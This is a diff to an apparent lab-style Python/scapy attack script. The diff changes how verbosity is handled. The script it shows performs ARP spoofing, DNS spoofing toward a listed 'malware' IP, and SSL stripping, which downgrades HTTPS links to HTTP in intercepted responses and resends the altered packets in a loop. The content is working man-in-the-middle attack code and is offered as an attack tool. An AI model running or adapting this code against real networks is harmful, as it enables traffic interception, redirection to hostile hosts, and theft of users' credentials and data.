@@ -8,8 +8,9 @@ ipMal = "50.63.7.226"   # Malware IP
 trapUrl = "www.google.com."
 ipTrap = "142.251.32.100"
 ip6Mal = ""
+verbose = False
 
-def ARP_spoofing(verbose=False):
+def ARP_spoofing():
     macM1 = "08:00:27:b7:c4:af"
     macM2 = "08:00:27:CC:28:6f"
     macM3 = "08:00:27:d0:25:4b"
@@ -42,7 +43,7 @@ def ARP_spoofing(verbose=False):
     sendp(arp_M2, iface = "enp0s3")
 
 # DNS-Spoof Attack
-def dns_spoof_attack(verbose=False):
+def dns_spoof_attack():
     if verbose:
         print "Starting DNS spoof attack"
 
@@ -94,51 +95,59 @@ def process_packet(packet):
 
 # SSL strip one packet
 def ssl_strip(packet):
+    if verbose:
+        print "Found HTTP response"
     if packet[TCP].payload:
         payload = bytes(packet[TCP].payload)
 
         # Only work with packets that are HTTP responses
         if b"HTTP" in payload and b"200 OK" in payload:
+            if verbose:
+                print "Stripping the secure channels from the packet"
             # Strip the secure channels from the packet
-            modified_payload = payload.replace(b"HTTPS://", b"HTTP://")
+            modified_payload = payload.replace(b"HTTPS://",b"HTTP://")
             packet.payload = bytes(modified_payload)
 
-            # By deleting the checksums, scapy will automatically recalculate them
+            # By deleting the checksums,scapy will automatically recalculate them
             del packet[IP].chksum
             del packet[TCP].chksum
 
-            send(packet, verbose=0)
+            print "Send altered packet"
+            send(packet,verbose=0)
 
-def ssl_strip_attack(verbose=False):
+def ssl_strip_attack():
     if verbose:
         print "Starting SSL strip attack"
 
     # prn = function to apply to each sniffed packet
-    sniff(filter="tcp and port 80", prn=ssl_strip)
+    sniff(filter="tcp and port 80",prn=ssl_strip)
 	
 
 # =============== Text Interface ===============
 
-def attack(wantVerbose):
+def attack():
     try:
         while True:
-            ARP_spoofing(verbose=wantVerbose)
-            dns_spoof_attack(verbose=wantVerbose)
+            ARP_spoofing()
+            dns_spoof_attack()
             time.sleep(20)
+            print "Starting attack again"
+
     except KeyboardInterrupt:
         pass
 
 if __name__ == "__main__":
     mode = str(input(   "Plase select the attack mode:\n" +
                     "type \"1\" for silent mode;\n" +
-                    "type \"2\" for all out mode\n"))
-    wantVerbose = False
+                    "type \"2\" for verbose mode\n"))
+
+    # Set the verbosity of the attack
     if mode == "1":
-        wantVerbose = False
+        verbose = False
     elif mode == "2":
-        wantVerbose = True
+        verbose = True
     else:
         print("Input error!")
 
-    attack(wantVerbose)
+    attack()
         
